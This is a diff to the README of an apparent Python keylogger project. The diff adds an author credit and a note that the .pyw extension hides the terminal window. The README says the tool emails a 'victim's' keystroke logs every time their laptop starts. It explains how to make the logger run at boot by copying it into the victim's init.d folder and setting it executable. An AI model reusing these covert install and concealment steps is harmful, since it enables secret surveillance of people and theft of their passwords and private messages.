@@ -1,5 +1,10 @@
 # KeyLogger
+#Author
+--Jidnyesh AJ
+jidnyesh.herokuapp.com
+
 This is a keylogger designed to send you email of the keylogs everytime the user or victim switch on his laptop.
+.pyw makes sure the terminal window dosen't open up while the script in runs.
 #Linux
 Copy this file to users PC in etc/init.d folder [linux] and then run [chmod +x etc/init.d/filename]
 First create a virtual enviroment in the same folder and activate it
